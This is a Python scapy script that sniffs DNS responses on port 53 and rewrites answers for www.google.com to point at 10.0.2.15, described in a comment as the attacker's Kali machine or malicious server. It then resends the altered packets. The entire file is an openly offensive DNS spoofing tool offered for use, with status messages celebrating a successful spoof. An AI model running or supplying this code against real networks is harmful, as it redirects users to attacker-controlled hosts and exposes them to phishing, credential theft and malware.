import scapy.all as scapy

def process_packet(packet):
    # Check if the packet has a DNS Resource Record (Response)
    if packet.haslayer(scapy.DNSRR):
        qname = packet[scapy.DNSQR].qname
        
        # We are looking for google.com
        if b"www.google.com" in qname:
            print("[+] Target Found: " + qname.decode())

            # Building the fake response
            # rdata is the IP of your Kali machine or malicious server
            fake_response = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            packet[scapy.DNS].an = fake_response
            packet[scapy.DNS].ancount = 1

            # Important: Delete layers so Scapy recalculates them
            # This prevents the 'Socket' error or corrupted packets
            del packet[scapy.IP].len
            del packet[scapy.IP].chksum
            del packet[scapy.UDP].len
            del packet[scapy.UDP].chksum

            # Sending the modified packet
            scapy.send(packet, verbose=False)
            print("[!!] Successfully Spoofed!")

print("[*] Waiting for DNS Packets... (Press Ctrl+C to stop)")

# Sniffing on Port 53 (DNS)
try:
    scapy.sniff(filter="udp port 53", prn=process_packet)
except Exception as e:
    print(f"[-] An error occurred: {e}")
